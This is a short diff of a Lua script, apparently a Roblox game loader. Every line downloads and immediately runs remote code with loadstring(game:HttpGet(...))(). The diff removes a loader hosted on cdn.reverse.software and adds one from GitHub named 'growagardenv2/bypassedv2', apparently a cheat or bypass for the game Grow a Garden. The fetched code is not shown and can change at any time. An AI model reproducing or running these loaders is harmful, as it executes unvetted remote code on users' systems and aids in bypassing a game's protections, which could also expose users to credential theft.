@@ -1,3 +1,2 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/tahongnilolagoreng/loadingscreeen/refs/heads/main/autoloadingv2.lua"))()
-ID="14f5a291-2099-4491-8092-0fd6c3fe8056";
-loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tahongnilolagoreng/growagardenv2/refs/heads/main/bypassedv2"))()
